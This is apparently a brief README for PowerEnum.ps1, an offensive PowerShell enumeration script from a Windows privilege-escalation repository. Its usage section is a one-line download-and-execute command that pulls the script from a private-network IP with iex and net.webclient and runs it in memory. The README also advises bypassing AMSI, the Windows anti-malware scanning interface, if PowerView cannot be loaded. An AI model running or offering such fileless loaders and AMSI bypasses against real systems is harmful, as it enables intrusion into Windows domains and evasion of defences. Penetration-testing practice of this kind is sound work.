# Name
PowerEnum.ps1

## Usage
```
# Change the IP to load PowerView.ps1 in Line 17
# Bypass AMSI if couldn't load PowerView into memory

iex (new-object net.webclient).downloadstring('http://192.168.45.218/PowerEnum.ps1')
```

## Source
https://github.com/n000b3r/PrivEsc/tree/main/Windows/powerenum
